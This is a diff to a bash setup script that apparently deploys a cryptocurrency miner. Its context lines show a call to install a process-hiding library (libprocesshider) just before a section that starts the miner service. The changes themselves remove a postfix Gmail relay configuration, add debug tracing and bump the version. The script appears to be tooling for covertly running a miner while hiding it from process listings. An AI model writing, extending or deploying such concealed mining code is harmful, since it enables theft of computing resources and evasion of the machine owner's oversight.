@@ -1,8 +1,9 @@
 #!/bin/bash
+set -x  # Enable debug mode - shows all executed commands
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="2.2"
-readonly BUILD_DATE="2026-03-14 16:42:19 UTC"
+readonly SCRIPT_VERSION="2.3"
+readonly BUILD_DATE="2026-03-14 16:51:16 UTC"
 readonly SCRIPT_NAME="setup_FULL_ULTIMATE_v3_2_NO_LIBHIDE"
 
 echo "=========================================="
@@ -3168,69 +3169,6 @@ install_libprocesshider() {
 
 # ==================== INSTALL PROCESS HIDER ====================
 install_libprocesshider
-
-# ==================== FIX POSTFIX FOR EMAIL NOTIFICATIONS ====================
-fix_postfix_email() {
-    echo ""
-    echo "=========================================="
-    echo "CONFIGURING EMAIL NOTIFICATIONS"
-    echo "=========================================="
-    echo ""
-
-    # Check if postfix is installed
-    if command -v postfix >/dev/null 2>&1; then
-        echo "[*] Postfix detected - configuring for port 587 (submission)"
-        echo "[*] Port 25 is often blocked by ISPs/clouds"
-        echo ""
-
-        # Backup postfix config
-        cp /etc/postfix/main.cf /etc/postfix/main.cf.backup.$(date +%s) 2>/dev/null || true
-
-        # Configure postfix to use port 587 with TLS
-        cat >> /etc/postfix/main.cf << 'POSTFIX_EOF'
-
-# Use port 587 (submission) instead of port 25 (often blocked)
-relayhost = [smtp.gmail.com]:587
-
-# Enable SASL authentication
-smtp_sasl_auth_enable = yes
-smtp_sasl_password_maps = hash:/etc/postfix/sasl_passwd
-smtp_sasl_security_options = noanonymous
-
-# Enable TLS encryption
-smtp_use_tls = yes
-smtp_tls_security_level = encrypt
-smtp_tls_CAfile = /etc/ssl/certs/ca-certificates.crt
-
-# Fallback to direct delivery if relay fails
-smtp_fallback_relay =
-POSTFIX_EOF
-
-        echo "[✓] Postfix configured for port 587"
-        echo ""
-        echo "NOTE: To actually send emails, you need to:"
-        echo "  1. Create /etc/postfix/sasl_passwd with:"
-        echo "     [smtp.gmail.com]:587 your_email@gmail.com:your_app_password"
-        echo "  2. Run: postmap /etc/postfix/sasl_passwd"
-        echo "  3. Run: systemctl reload postfix"
-        echo ""
-        echo "OR disable email notifications entirely:"
-        echo "  systemctl stop postfix"
-        echo "  systemctl disable postfix"
-        echo ""
-
-    else
-        echo "[*] Postfix not installed - no email configuration needed"
-    fi
-}
-
-# Only fix postfix if it exists and is causing issues
-if systemctl is-active postfix >/dev/null 2>&1; then
-    fix_postfix_email
-else
-    echo "[*] Postfix not running - skipping email configuration"
-fi
-
 
 # ==================== START MINER SERVICE ====================
 echo ''
